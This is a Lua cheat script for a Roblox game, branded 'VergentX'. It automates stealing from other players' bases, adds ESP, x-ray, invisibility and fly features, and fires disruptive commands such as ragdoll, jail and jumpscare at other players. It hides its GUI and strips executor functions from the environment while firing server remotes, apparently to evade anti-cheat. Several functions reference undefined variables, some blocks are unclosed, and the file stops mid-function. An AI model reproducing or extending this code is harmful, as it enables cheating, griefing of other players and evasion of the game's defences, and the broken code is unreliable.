if not game:IsLoaded() then game.Loaded:Wait() end 
pcall(function() game:GetService("Players").RespawnTime = 0 end)
local privateBuild = false
if game.PlaceId ~= 109983668079237 and game.PlaceId ~= 96342491571673 then return end

local Players           = game:GetService("Players")
local UserInputService  = game:GetService("UserInputService")
local TweenService      = game:GetService("TweenService")
local RunService        = game:GetService("RunService")
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace         = game:GetService("Workspace")
local TeleportService    = game:GetService("TeleportService")
local VirtualInputManager = game:GetService("VirtualInputManager")

do
    local t0 = os.clock()
    while not game:IsLoaded() and (os.clock() - t0) < 20 do task.wait() end  

local LP = Players.LocalPlayer
do
    local t0 = os.clock()
    while not LP and (os.clock() - t0) < 20 do
        task.wait()
        LP = Players.LocalPlayer
    end
end
if not LP then return end

local PlayerGui = LP:FindFirstChildOfClass("PlayerGui")
    or LP:WaitForChild("PlayerGui", 20)
if not PlayerGui then return end

pcall(function()
    if typeof(setfpscap) == "function" then setfpscap(999) end
end)
pcall(function()
    if typeof(set_fps_cap) == "function" then set_fps_cap(999) end
end)

local VXGui = PlayerGui
do
    local ok, hidden = pcall(function()
        if typeof(gethui) == "function" then return gethui() end
        return nil
    end)
    if ok and hidden then
        VXGui = hidden
    else
        local ok2, cg = pcall(function() return game:GetService("CoreGui") end)
        if ok2 and cg then
            local ok3 = pcall(function()
                local probe = Instance.new("ScreenGui")
                probe.Parent = cg
                probe:Destroy()
            end)
            if ok3 then VXGui = cg end
        end
    end

pcall(function() math.randomseed(math.floor((os.clock() * 1e7) % 2147483647) + 7919) end)

local VX_GUI_TAG = "__VXPublicGui"

_G.VXPublicNames = _G.VXPublicNames or {}
local _vxNameCache = _G.VXPublicNames
local function _vxName(key)
    local v = _vxNameCache[key]
    if not v then
        local t = {}
        for i = 1, math.random(10, 16) do
            t[i] = (math.random(0, 1) == 0) and string.char(math.random(65, 90))
                or string.char(math.random(97, 122))
        end
        v = table.concat(t)
        _vxNameCache[key] = v
    end
    return v
end

local function mountGui(gui)
    pcall(function()
        if syn and syn.protect_gui then syn.protect_gui(gui) end
    end)
    pcall(function()
        if typeof(protectgui) == "function" then protectgui(gui) end
    end)
    gui:SetAttribute(VX_GUI_TAG, true)
    gui.Parent = VXGui
    return gui
end

local VX_GUI_KEYS = {
    "VergentXPublic", "VergentXStatusHUD", "VergentXBrainrotPanel",
    "VergentXCmdPanel", "VergentXAdminPanel", "VergentXAdminControl",
    "VergentXNotif",
}
local Plots = Workspace:FindFirstChild("Plots") or Workspace:WaitForChild("Plots", 5)
if not Plots then
    Plots = Instance.new("Folder")
    task.spawn(function()
        local live = Workspace:WaitForChild("Plots", 300)
        if live then Plots = live end  
    end)
end
do
    local stale = {
        "VergentXPublic", "VergentXStealBar", "VergentXAP",
        "VergentXStatusHub", "VergentXAutoSteal", "AutoStealGui",
        "VergentXCmdPanel", "VergentXActions",
        "MWPHub", "MWPHubAP",
    }
    for _, container in ipairs({ PlayerGui, VXGui }) do
        for _, name in ipairs(stale) do
            local old = container:FindFirstChild(name)
            if old then pcall(function() old:Destroy() end) end
        end
    end

    for _, key in ipairs(VX_GUI_KEYS) do
        local old = VXGui:FindFirstChild(_vxName(key))
        if old then pcall(function() old:Destroy() end) end
        old = PlayerGui:FindFirstChild(_vxName(key))
        if old then pcall(function() old:Destroy() end) end
    end

    local containers = { PlayerGui, VXGui }
    pcall(function()
        local cg = game:GetService("CoreGui")
        if cg and cg ~= VXGui then containers[#containers + 1] = cg end
    end)
    for _, container in ipairs(containers) do
        local ok, kids = pcall(function() return container:GetChildren() end)
        if ok then
            for _, child in ipairs(kids) do
                if child:GetAttribute(VX_GUI_TAG) then
                    pcall(function() child:Destroy() end)
                end
            end
    end
end

_G.VXPublicGen = (_G.VXPublicGen or 0) + 1
local VX_GEN = _G.VXPublicGen
local function vxAlive()
    return _G.VXPublicGen == VX_GEN
end

if _G.VXPublicConns then
    for _, c in ipairs(_G.VXPublicConns) do
        pcall(function() c:Disconnect() end)
    end
end
_G.VXPublicConns = {}
local VXConns = _G.VXPublicConns

local function vxBind(signal, fn)
    VXConns[#VXConns + 1] = c
    return c
end

do
    local HIDDEN_KEYS = {
        "identifyexecutor",
        "islclosure",
        "iscclosure",
        "hookfunction",
        "getgenv",
        "getrenv",
    }

    _G.VXSafeNetCall = function(fn, ...)
        if type(fn) ~= "function" then return false end
        local env = getgenv and getgenv() or _G
        local saved = {}
        for _, key in ipairs(HIDDEN_KEYS) do
            saved[key] = rawget(env, key)
            rawset(env, key, nil)
        end
        local ok, a, b, c, d, e = pcall(fn, ...)
        for k, v in next, saved do
            if v ~= nil then
                rawset(env, k, v)
            end
        end
        if ok then return true, a, b, c, d, e end
        return false, a
    end

    local _remoteCache
    do
        local env = getgenv and getgenv() or _G
        if type(_remoteCache) ~= "table" then
            _remoteCache = {}
            rawset(env, "__VXRemoteCache", _remoteCache)
        end
    end

    local NAME_HASH = {
        UseItem = "068a62948a73ec6c61f9f22ada765e9fc2add9b70cb9e2da5732837444a3f862",
    }
    local NAME_SUFFIX = {
        ["QuantumCloner/OnTeleport"] = "OnTeleport",
        ["UseItem"] = "UseItem",
    }

    local function isRemoteInst(v)
        return typeof(v) == "Instance"
            and (v:IsA("RemoteEvent") or v:IsA("RemoteFunction") or v:IsA("UnreliableRemoteEvent"))
    end

    local function rememberRemote(name, inst)
        if not isRemoteInst(inst) then return end
        name = tostring(name)
        if name:match("^RE/") or name:match("^RF/") then return end
        _remoteCache[name] = inst
        if name == "UseItem" then
            _G.VXUseItemRemote = inst
        elseif name == "QuantumCloner/OnTeleport" then
            _G.VXOnTeleportRemote = inst
        end
    end
 
    local function lookupRemote(name)
        local pkgs = ReplicatedStorage:FindFirstChild("Packages")
        if not folder then return nil end         
        local hash = NAME_HASH[name]
        local suf = NAME_SUFFIX[name]
        for _, d in ipairs(folder:GetDescendants()) do
            if isRemoteInst(d) then
                local dn = tostring(d.Name or "")
                if dn == name or (hash and dn == hash) then return d end
                if suf and (dn == suf or dn:sub(-#suf) == suf or dn:find(suf, 1, true)) then
                    return d
                end
            end
        end
        if hash then
            local hit = folder:FindFirstChild(hash, true)
            if isRemoteInst(hit) then return hit end
        end
        local hit2 = folder:FindFirstChild(name, true)
        if isRemoteInst(hit2) then return hit2 end
        return nil
    end

    _G.VXGetRemote = function(name)
        name = tostring(name)
        local hit = _remoteCache[name]
        if hit and hit.Parent then return hit end
        if name == "UseItem" and _G.VXUseItemRemote and _G.VXUseItemRemote.Parent then
            return _G.VXUseItemRemote
        end
        if name == "QuantumCloner/OnTeleport" and _G.VXOnTeleportRemote and _G.VXOnTeleportRemote.Parent then
            return _G.VXOnTeleportRemote
        end
        hit = lookupRemote(name)
        if hit then rememberRemote(name, hit); return hit end
        return nil
    end

    _G.VXWaitRemote = function(name, timeout)
        local hit = _G.VXGetRemote(name)
        if hit then return hit end
        local lim = tonumber(timeout) or 0
        if lim <= 0 then return nil end
        local t0 = os.clock()
        while os.clock() - t0 < lim do
            hit = _G.VXGetRemote(name)
            if hit then return hit end
            RunService.Heartbeat:Wait()
        end
        return _G.VXGetRemote(name)
    end

    local _netModule
    local function getNetModule()
        if _netModule then return _netModule end
        local ok, mod = _G.VXSafeNetCall(function()
            return require(ReplicatedStorage
                :WaitForChild("Packages"):WaitForChild("Net")
                :WaitForChild("Net"))
        end)
        if ok and type(mod) == "table" then
            _netModule = mod
        end
        return _netModule
    end

    task.spawn(function()
        local t0 = os.clock()
        while os.clock() - t0 < 10 do
            _G.VXGetRemote("UseItem")
            _G.VXGetRemote("QuantumCloner/OnTeleport")
            if _G.VXUseItemRemote and _G.VXOnTeleportRemote then break end
            task.wait(0.2)
        end
    end)

    _G.VXNetFire = function(path, ...)
        local args = { ... }
        return _G.VXSafeNetCall(function()
            local logical = tostring(path)
            if logical:sub(1, 3) == "RE/" or logical:sub(1, 3) == "RF/" then
                logical = logical:sub(4)
            end

            local cached = _G.VXGetRemote(logical)
            if cached and cached.FireServer then
                cached:FireServer(table.unpack(args))
                return true
            end

            local net = getNetModule()
            if net then
                if type(net.RemoteEvent) == "function" then
                    local okRE, re = pcall(function() return net:RemoteEvent(logical) end)
                    if okRE and re and re.FireServer then
                        pcall(rememberRemote, logical, re)
                        re:FireServer(table.unpack(args))
                        return true
                    end
                end
                if type(net.FireServer) == "function" then
                    net:FireServer("RE/" .. logical, table.unpack(args))
                    return true
                end
            end

            local netFolder = ReplicatedStorage:FindFirstChild("Packages")
            netFolder = netFolder and netFolder:FindFirstChild("Net")
            local remote = netFolder and netFolder:FindFirstChild("RE/" .. logical)
            if remote and remote.FireServer then
                remote:FireServer(table.unpack(args))
                return true
            end
            return false
        end)
    end

    _G.VXFireRemote = function(remote, ...)
        if not remote or not remote.FireServer then return false end
        local args = { ... }
        return _G.VXSafeNetCall(function()
            return remote:FireServer(table.unpack(args))
        end)
    end

    _G.VXFirePrompt = function(prompt, count)
        if not prompt or not prompt.Parent then return false end
        local ok, res = _G.VXSafeNetCall(function()
            count = tonumber(count) or 1
            if count < 1 then count = 1 end
            if typeof(fireproximityprompt) == "function" then
                fireproximityprompt(prompt, count)
            elseif typeof(firesignal) == "function" then
                for _ = 1, count do
                    pcall(firesignal, prompt.Triggered)
                end
            else
                return false
            end
            return true
        end)
        return (ok and res) and true or false
    end
end

local FileName = "VergentX Public Configuration.json"

local DefaultConfig = {
    AUTO_STEAL        = false,
    STEAL_RANGE       = 999,
    INSTANT_STEAL     = false,

    AUTO_KICK         = false,
    CTRL_PANEL        = false,
    NO_ANIM           = false,
    AUTO_INVIS        = false,
    AUTO_ROTATE_INVIS = false,
    INVIS_ANGLE       = 180,
    INVIS_DEPTH       = 8,
    BASE_DETECTOR     = false,
    INFINITE_JUMP     = false,
    ANTI_RAGDOLL      = false,
    PLAYER_ESP        = false,
    XRAY              = false,
    SLOT_ESP          = false,
    SLOT_PLATFORMS    = false,
    FLOOR_PLATFORM    = false,
    BASE_OWNER_ESP    = false,
    BASE_DISPLAY      = false,
    CARPET_SPEED      = false,
    FLY_TOOL          = "Flying Carpet",

    AP_PANEL          = false,
    ADMIN_CONTROL     = false,
    CLICK_TO_AP       = false,
    SINGLE_AP         = false,
    PROXIMITY_RANGE   = 15,
    ADMIN_CMD_DELAY   = 0,
    ADMIN_CMD_ORDER   = { "rocket", "ragdoll", "jail", "balloon", "inverse", "tiny", "jumpscare", "morph" },
    ADMIN_CMD_ENABLED = {},

    GRAPHICS_STRIP    = true,
    FOV               = 70,

    HOP_MAX_PLAYERS   = 2,

    UI_SCALE          = 1,
    STEALBAR_Y        = 0,
    CMD_PANEL         = false,
    ACTIONS_PANEL     = false,
    GUI_LOCKED        = false,

    KEYS = {
        Menu        = "LeftControl",
        CarpetSpeed = "",
        ProximityAP = "",
        ClickToAP   = "",
        SpamNearest = "",
        SpamOwner   = "",
        InstantClone = "",
        InstantReset = "",
        Rejoin      = "",
        CopyJobId   = "",
        ServerHop   = "",
    },

    MAIN_POS   = { 0.5, 0, 0.5, 0 },
    HUB_POS    = { 0.5, 0, 0.08, 0 },
    QUICK_POS  = { 0.5, 0, 0.3, 0 },
    CMD_POS    = { 0.5, 0, 0.5, 0 },
    ACTRL_POS  = { 0.5, 0, 0.5, 0 },
    CTRL_POS   = { 0.5, 0, 0.5, 0 },
    ACT_POS    = { 0.5, 0, 0.5, 0 },
    LAUNCH_POS = { 0.5, 0, 0.5, 0 },
}

_G.VXFlyTools = {
    "Flying Carpet", "Cupid's Wings", "Santa's Sleigh", "Witch's Broom", "Waverider",
}

local function deepCopy(src)
    if type(src) ~= "table" then return src end
    local out = {}
    for k, v in pairs(src) do out[k] = deepCopy(v) end
    return out
end

local CONFIG = deepCopy(DefaultConfig)

local function saveConfig()
    if not writefile then return false end
    local ok = pcall(function()
        writefile(FileName, HttpService:JSONEncode(CONFIG))
    end)
    return ok
end
local function applyFactoryDefaults(cfg)
    for k, v in pairs(DefaultConfig) do cfg[k] = deepCopy(v) end
    saveConfig()
    return cfg
end
_G.VXApplyFactoryDefaults = applyFactoryDefaults
local function loadConfig()
    local ok, content = pcall(function() return readfile(FileName) end)
    if not ok or not content then return end
    local ok2, data = pcall(function() return HttpService:JSONDecode(content) end)
    if not ok2 or type(data) ~= "table" then return end

    for key, value in pairs(data) do
        if DefaultConfig[key] ~= nil and type(value) == type(DefaultConfig[key]) then
            CONFIG[key] = value
        end
    end

    CONFIG.STEAL_RANGE     = 999
    CONFIG.UI_SCALE        = math.clamp(tonumber(CONFIG.UI_SCALE) or 1, 0.7, 1.4)
    CONFIG.FOV             = math.clamp(tonumber(CONFIG.FOV) or 70, 70, 120)
    CONFIG.PROXIMITY_RANGE = math.clamp(tonumber(CONFIG.PROXIMITY_RANGE) or 15, 5, 50)
    CONFIG.ADMIN_CMD_DELAY = math.clamp(tonumber(CONFIG.ADMIN_CMD_DELAY) or 0, 0, 0.5)
    CONFIG.HOP_MAX_PLAYERS = math.clamp(math.floor(tonumber(CONFIG.HOP_MAX_PLAYERS) or 2), 1, 20)
    CONFIG.INVIS_ANGLE     = math.clamp(math.floor(tonumber(CONFIG.INVIS_ANGLE) or 180), 180, 360)
    CONFIG.INVIS_DEPTH     = math.clamp(
        math.floor((tonumber(CONFIG.INVIS_DEPTH) or 8) * 10 + 0.5) / 10, 5, 10)
    CONFIG.STEALBAR_Y      = math.max(0, math.floor(tonumber(CONFIG.STEALBAR_Y) or 0))

    do
        local knownTool = false
        for _, n in ipairs(_G.VXFlyTools) do
            if CONFIG.FLY_TOOL == n then knownTool = true break end
        end
        if not knownTool then CONFIG.FLY_TOOL = DefaultConfig.FLY_TOOL end
    end

    if type(CONFIG.KEYS) ~= "table" then CONFIG.KEYS = deepCopy(DefaultConfig.KEYS) end
    for k, v in pairs(DefaultConfig.KEYS) do
        if type(CONFIG.KEYS[k]) ~= "string" then CONFIG.KEYS[k] = v end
    end
    for k in pairs(CONFIG.KEYS) do
        if DefaultConfig.KEYS[k] == nil then CONFIG.KEYS[k] = nil end
    end
    if type(CONFIG.ADMIN_CMD_ORDER) ~= "table" or #CONFIG.ADMIN_CMD_ORDER == 0 then
        CONFIG.ADMIN_CMD_ORDER = deepCopy(DefaultConfig.ADMIN_CMD_ORDER)
    end
    if type(CONFIG.ADMIN_CMD_ENABLED) ~= "table" then CONFIG.ADMIN_CMD_ENABLED = {} end
end

if isfile and not isfile(FileName) then
    applyFactoryDefaults(CONFIG)
    saveConfig()
else
    loadConfig()
end

_G.VXGuiLocked = CONFIG.GUI_LOCKED == true

local IS_MOBILE = (function()
    local ok, touch = pcall(function()
        return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
    end)
    return ok and touch or false
end)()

local MOBILE_SCALE = (IS_MOBILE and 0.75 or 1) * 0.8367

local VXScaleRegistry = {}
local VXLiveScale = math.clamp(tonumber(CONFIG.UI_SCALE) or 1, 0.7, 1.4)

local function VergentXRegisterScale(uiScale, base)
    base = base or 1
    uiScale.Scale = base * VXLiveScale
    table.insert(VXScaleRegistry, { ui = uiScale, base = base })
    return uiScale
end

local function VXApplyUiScale(v)
    VXLiveScale = math.clamp(tonumber(v) or 1, 0.7, 1.4)
    CONFIG.UI_SCALE = VXLiveScale
    for _, e in ipairs(VXScaleRegistry) do
        if e.ui and e.ui.Parent then e.ui.Scale = e.base * VXLiveScale end
    end
    saveConfig()
end

local Theme = {
    Background       = Color3.fromRGB(11, 11, 13),
    Surface          = Color3.fromRGB(16, 16, 19),
    SurfaceLight     = Color3.fromRGB(26, 27, 31),
    SurfaceHighlight = Color3.fromRGB(36, 37, 42),
    Accent1          = Color3.fromRGB(170, 174, 182),
    Accent2          = Color3.fromRGB(200, 160, 66),
    TextPrimary      = Color3.fromRGB(240, 241, 245),
    TextSecondary    = Color3.fromRGB(205, 208, 215),
    TextMuted        = Color3.fromRGB(172, 176, 185),
    Success          = Color3.fromRGB(120, 230, 170),
    Error            = Color3.fromRGB(255, 90, 120),
    Warning          = Color3.fromRGB(255, 180, 90),
    GoldHi           = Color3.fromRGB(236, 210, 146),
    GoldLo           = Color3.fromRGB(146, 108, 40),
    SilverHi         = Color3.fromRGB(224, 228, 236),
    SilverLo         = Color3.fromRGB(116, 120, 128),
}

local VergentXPalette = {
    Orb1    = Color3.fromRGB(196, 156, 64),
    Orb2    = Color3.fromRGB(150, 154, 162),
    Orb3    = Color3.fromRGB(96, 99, 107),
    Orb4    = Color3.fromRGB(188, 192, 200),
    Star    = Color3.fromRGB(214, 217, 223),
    BorderA = Color3.fromRGB(140, 144, 152),
    BorderB = Color3.fromRGB(74, 77, 84),
}

local COLORS = {
    bg          = Theme.Background,
    row         = Color3.fromRGB(12, 12, 14),
    row2        = Theme.SurfaceLight,
    stroke      = Theme.Accent1,
    strokeSoft  = Color3.fromRGB(6, 6, 8),
    white       = Theme.TextPrimary,
    textDim     = Theme.TextMuted,
    toggleBg    = Color3.fromRGB(44, 45, 51),
    toggleOn    = Color3.fromRGB(188, 150, 62),
    knob        = Color3.fromRGB(255, 255, 255),
    knobOn      = Color3.fromRGB(255, 255, 255),
    gold        = Theme.GoldHi,
    goldBright  = Color3.fromRGB(246, 228, 178),
    goldDim     = Theme.GoldLo,
    silverHi    = Theme.SilverHi,
    silverLo    = Theme.SilverLo,
    green       = Theme.Success,
    red         = Theme.Error,
}

local RING_SEQ = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Theme.SilverLo),
    ColorSequenceKeypoint.new(0.5, Theme.GoldHi),
    ColorSequenceKeypoint.new(1, Theme.SilverLo),
})

local function new(class, props, parent)
    local obj = Instance.new(class)
    if props then
        for k, v in pairs(props) do obj[k] = v end
    end
    if parent then obj.Parent = parent end
    return obj
end

local function corner(parent, radius)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, radius or 8)
    c.Parent = parent
    return c
end

local function gradient(inst, colorSeq, rotation, transparencySeq)
    local g = Instance.new("UIGradient")
    if colorSeq then g.Color = colorSeq end
    if rotation then g.Rotation = rotation end
    if transparencySeq then g.Transparency = transparencySeq end
    g.Parent = inst
    return g
end

local VX_FADE_PROPS = {
    Frame          = { "BackgroundTransparency" },
    ScrollingFrame = { "BackgroundTransparency" },
    TextLabel      = { "BackgroundTransparency", "TextTransparency", "TextStrokeTransparency" },
    TextButton     = { "BackgroundTransparency", "TextTransparency", "TextStrokeTransparency" },
    TextBox        = { "BackgroundTransparency", "TextTransparency", "TextStrokeTransparency" },
    ImageLabel     = { "BackgroundTransparency", "ImageTransparency" },
    ImageButton    = { "BackgroundTransparency", "ImageTransparency" },
    ViewportFrame  = { "BackgroundTransparency", "ImageTransparency" },
    UIStroke       = { "Transparency" },
}
local VX_FADE_CAP = 110

local function vxFadeReveal(root, dur)
    if not root or not root.Parent then return end
    local now = os.clock()
    local last = root:GetAttribute("VXFadeAt")
    if last and (now - last) < 0.7 then return end
    root:SetAttribute("VXFadeAt", now)

    local items, n = {}, 0
    local function grab(inst)
        local props = VX_FADE_PROPS[inst.ClassName]
        if not props then return end
        for i = 1, #props do
            if n >= VX_FADE_CAP then return end
            local p = props[i]
            local ok, v = pcall(function() return inst[p] end)
            if ok and type(v) == "number" and v < 1 then
                n = n + 1
                items[n] = { inst, p, v }
                inst[p] = 1
            end
        end
    end

    pcall(grab, root)
    local kids = root:GetDescendants()
    for i = 1, #kids do
        if n >= VX_FADE_CAP then break end
        pcall(grab, kids[i])
    end

    local ti = TweenInfo.new(dur or 0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    for i = 1, n do
        local it = items[i]
        pcall(function() TweenService:Create(it[1], ti, { [it[2]] = it[3] }):Play() end)
    end
end

local function vxAttachReveal(gui, frame)
    if not gui or not frame then return end
    gui:GetPropertyChangedSignal("Enabled"):Connect(function()
        if gui.Enabled then task.defer(vxFadeReveal, frame) end
    end)
    if gui.Enabled then task.defer(vxFadeReveal, frame) end
end

local function applyMarble(frame, spread)
    frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    local g = Instance.new("UIGradient")
    g.Rotation = -40
    if spread then
        g.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(54, 44, 23)),
            ColorSequenceKeypoint.new(0.18, Color3.fromRGB(40, 34, 21)),
            ColorSequenceKeypoint.new(0.36, Color3.fromRGB(24, 22, 19)),
            ColorSequenceKeypoint.new(0.52, Color3.fromRGB(15, 15, 17)),
            ColorSequenceKeypoint.new(0.68, Color3.fromRGB(22, 23, 26)),
            ColorSequenceKeypoint.new(0.85, Color3.fromRGB(32, 34, 39)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(40, 42, 49)),
        })
    else
        g.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(48, 40, 22)),
            ColorSequenceKeypoint.new(0.24, Color3.fromRGB(15, 15, 17)),
            ColorSequenceKeypoint.new(0.76, Color3.fromRGB(15, 15, 17)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(34, 36, 42)),
        })
    end
    g.Parent = frame
    return g
end

local function textShine(label)
    if label:FindFirstChild("VergentX_TextShine") then return label end
    local g = Instance.new("UIGradient")
    g.Name = "VergentX_TextShine"
    g.Rotation = 0
    g.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.50, Color3.fromRGB(241, 243, 247)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(225, 228, 234)),
    })
    g.Parent = label
    return label
end

local function complexBG(frame, opts)
    opts = opts or {}
    local rad = opts.corner or 12

    if opts.sheen ~= false then
        local sheenClip = new("Frame", {
            Name = "VergentX_SheenClip", Size = UDim2.new(1, 0, 1, 0),
            BackgroundTransparency = 1, ZIndex = 0, ClipsDescendants = true,
        }, frame)
        corner(sheenClip, rad)

        local sheen = new("Frame", {
            Name = "VergentX_Sheen", Size = UDim2.new(1, 0, 0.42, 0),
            BackgroundColor3 = Color3.fromRGB(222, 224, 228),
            BorderSizePixel = 0, ZIndex = 0,
        }, sheenClip)
        corner(sheen, rad)
        gradient(sheen, nil, 90, NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.94),
            NumberSequenceKeypoint.new(1, 1),
        }))

        local vignette = new("Frame", {
            Name = "VergentX_Vignette", AnchorPoint = Vector2.new(0, 1),
            Position = UDim2.new(0, 0, 1, 0), Size = UDim2.new(1, 0, 0.5, 0),
            BackgroundColor3 = Color3.fromRGB(0, 0, 0),
            BorderSizePixel = 0, ZIndex = 0,
        }, sheenClip)
        corner(vignette, rad)
        gradient(vignette, nil, 90, NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(1, 0.82),
        }))

        local edge = new("Frame", {
            Name = "VergentX_EdgeLight", Position = UDim2.new(0, rad, 0, 0),
            Size = UDim2.new(1, -rad * 2, 0, 1),
            BackgroundColor3 = Color3.fromRGB(158, 162, 170),
            BackgroundTransparency = 0.72, BorderSizePixel = 0, ZIndex = 0,
        }, sheenClip)
        gradient(edge, nil, 0, NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.5, 0.1),
            NumberSequenceKeypoint.new(1, 1),
        }))
    end

    if opts.border ~= false then
        local s = new("UIStroke", {
            Name = "VergentX_Border", Thickness = 0.8, Transparency = 0.4,
            Color = VergentXPalette.BorderA, ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
        }, frame)
        gradient(s, ColorSequence.new({
            ColorSequenceKeypoint.new(0, VergentXPalette.BorderA),
            ColorSequenceKeypoint.new(0.5, VergentXPalette.BorderB),
            ColorSequenceKeypoint.new(1, VergentXPalette.BorderA),
        }), 45)
        return s
    end
end

local function toggleRing(toggleFrame, gapPx)
    gapPx = gapPx or 5
    local inner = Instance.new("UIStroke", toggleFrame)
    inner.Thickness = 1
    inner.Transparency = 0.35
    inner.Color = Color3.fromRGB(6, 6, 8)
    inner.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    gradient(inner, RING_SEQ, 25)

    local ring = Instance.new("Frame", toggleFrame)
    ring.Name = "VergentX_ToggleRing"
    ring.AnchorPoint = Vector2.new(0.5, 0.5)
    ring.Position = UDim2.new(0.5, 0, 0.5, 0)
    ring.Size = UDim2.new(1, gapPx, 1, gapPx)
    ring.BackgroundTransparency = 1
    Instance.new("UICorner", ring).CornerRadius = UDim.new(1, 0)

    local outer = Instance.new("UIStroke", ring)
    outer.Thickness = 1
    outer.Transparency = 0.7
    outer.Color = Color3.fromRGB(6, 6, 8)
    outer.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    gradient(outer, RING_SEQ, 205)
    return inner
end

local function tableToUDim2(t, fallback)
    if type(t) == "table" and #t == 4 then
        return UDim2.new(t[1], t[2], t[3], t[4])
    end
    return fallback
end

local function udim2ToTable(u)
    return { u.X.Scale, u.X.Offset, u.Y.Scale, u.Y.Offset }
end

local function makeDraggable(handle, onMoved, target)
    target = target or handle
    local dragging = false
    local dragStart, startPos, dragInput
    handle.InputBegan:Connect(function(input)
        if _G.VXGuiLocked == true then return end
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = target.Position
            local conn
            conn = input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    if conn then conn:Disconnect() end
                    if onMoved then pcall(onMoved, target.Position) end
                end
            end)
        end
    end)
    handle.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    vxBind(UserInputService.InputChanged, function(input)
        if _G.VXGuiLocked == true then return end
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            target.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end

local function VergentXTextShine(root)
    for _, d in ipairs(root:GetDescendants()) do
        if (d:IsA("TextLabel") or d:IsA("TextButton")) and not d.RichText then
            local c = d.TextColor3
            if math.min(c.R, c.G, c.B) >= 0.4 then
                textShine(d)
            end
        end
    end
end

local function VergentXTitleGrad(label)
    return gradient(label, ColorSequence.new({
        ColorSequenceKeypoint.new(0, Theme.GoldHi),
        ColorSequenceKeypoint.new(1, Theme.GoldLo),
    }), 25)
end

local function VergentXNameGrad(label)
    return gradient(label, ColorSequence.new({
        ColorSequenceKeypoint.new(0, Theme.SilverHi),
        ColorSequenceKeypoint.new(1, Theme.GoldHi),
    }), 20)
end

local function _vxApplySavedPos(targetFrame, positionKey, defX, defY)
    local saved = CONFIG[positionKey]
    if type(saved) == "table" and #saved == 4 then
        targetFrame.Position = UDim2.new(saved[1], saved[2], saved[3], saved[4])
    else
        targetFrame.Position = UDim2.new(defX or 0.5, 0, defY or 0.5, 0)
    end
end

local function MakeDraggable(dragBar, targetFrame, positionKey)
    makeDraggable(dragBar, function(pos)
        if positionKey then
            CONFIG[positionKey] = udim2ToTable(pos)
            saveConfig()
        end
    end, targetFrame)
end

local AnimalModels
do
    local m = ReplicatedStorage:FindFirstChild("Models")
    AnimalModels = m and m:FindFirstChild("Animals") or nil
    if not AnimalModels then
        task.spawn(function()
            local mm = ReplicatedStorage:WaitForChild("Models", 30)
            AnimalModels = mm and mm:WaitForChild("Animals", 30) or nil
        end)
    end
end

local function VergentXCloneForViewport(template)
    if not template then return nil end
    local unarch = {}
    if not template.Archivable then unarch[#unarch + 1] = template; template.Archivable = true end
    for _, d in ipairs(template:GetDescendants()) do
        if not d.Archivable then unarch[#unarch + 1] = d; d.Archivable = true end
    end
    local ok, clone = pcall(function() return template:Clone() end)
    for _, d in ipairs(unarch) do pcall(function() d.Archivable = false end) end
    if not ok or not clone then return nil end
    for _, d in ipairs(clone:GetDescendants()) do
        if d:IsA("BaseScript") or d:IsA("ModuleScript") or d:IsA("Sound")
            or d:IsA("ParticleEmitter") or d:IsA("BillboardGui") then
            pcall(function() d:Destroy() end)
        end
    end
    return clone
end

local function VergentXFindAnimalTemplate(folder, animalName)
    if not folder then return nil end
    local template = folder:FindFirstChild(animalName)
    if template then return template end
    local want = tostring(animalName):gsub("^%s+", ""):gsub("%s+$", ""):lower()
    for _, m in ipairs(folder:GetChildren()) do
        if m.Name:lower() == want then return m end
    end
    if #want >= 4 then
        for _, m in ipairs(folder:GetChildren()) do
            local n = m.Name:lower()
            if n:find(want, 1, true) or want:find(n, 1, true) then return m end
        end
    end
    return nil
end

local function VergentXFindLiveAnimalModel(petLike)
    if type(petLike) ~= "table" then return nil end
    local m = petLike._model or petLike.model
    if typeof(m) == "Instance" and m.Parent then return m end
    if not petLike.plot then return nil end

    local found = nil
    pcall(function()
        local plotsFolder = Workspace:FindFirstChild("Plots")
        local plotInst = plotsFolder and plotsFolder:FindFirstChild(tostring(petLike.plot))
        if not plotInst then return end
        local podiums = plotInst:FindFirstChild("AnimalPodiums")
        local podium = podiums and petLike.slot and podiums:FindFirstChild(tostring(petLike.slot))
        local podiumPos = nil
        if podium then
            local okP, ppos = pcall(function() return podium:GetPivot().Position end)
            if okP and typeof(ppos) == "Vector3" then podiumPos = ppos end
        end
        local wantNames = {}
        if petLike.petName then wantNames[tostring(petLike.petName):lower()] = true end
        if petLike.name then wantNames[tostring(petLike.name):lower()] = true end
        if petLike.index then wantNames[tostring(petLike.index):lower()] = true end
        local bestDist = math.huge
        for _, desc in ipairs(plotInst:GetDescendants()) do
            if desc:IsA("Model") and wantNames[desc.Name:lower()]
                and desc:FindFirstChildWhichIsA("BasePart", true) then
                if podiumPos then
